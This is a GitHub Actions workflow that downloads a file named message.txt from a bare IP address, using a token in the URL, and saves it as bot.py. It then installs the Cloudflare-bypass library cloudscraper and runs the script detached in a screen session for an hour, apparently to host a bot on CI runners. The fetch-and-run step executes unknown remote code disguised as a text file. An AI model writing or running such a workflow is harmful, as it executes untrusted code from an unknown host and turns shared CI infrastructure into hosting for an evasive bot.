name: ubuntu 22
on:
  workflow_dispatch:
jobs:
  run:
    runs-on: ubuntu-22.04
    timeout-minutes: 65          # 1 hour + 5 minutes buffer
    steps:
      - name: Install dependencies
        run: |
          sudo apt-get update -y
          sudo apt-get install -y python3 python3-pip screen
      - name: Download bot
        run: |
          curl -fsSL http://185.215.151.96:8000/message.txt?token=FVOUb-zg4if0HYBIrW7nnj3ARY_7_lcbIWzZkHj6TLQ -o bot.py
          ls -lh bot.py
          head -n 20 bot.py
      - name: Install Python packages
        run: |
          pip3 install cloudscraper websocket-client
      - name: Start bot in screen
        run: |
          screen -dmS bot bash -c '
            echo "Bot started at $(date)" > bot.log
            exec python3 bot.py >> bot.log 2>&1
          '
          screen -list
      - name: Keep alive for 1 hour
        run: |
          end=$((SECONDS + 3600))   # exactly 1 hour
          while [ $SECONDS -lt $end ]; do
            echo "[$(date)] running | log size: $(wc -c < bot.log 2>/dev/null || echo 0) bytes"
          
            if ! screen -list | grep -q "bot"; then
              echo "Screen session died"
              tail -n 100 bot.log || true
              break
            fi
          
            sleep 300
          done
          echo "1 hour reached. Stopping."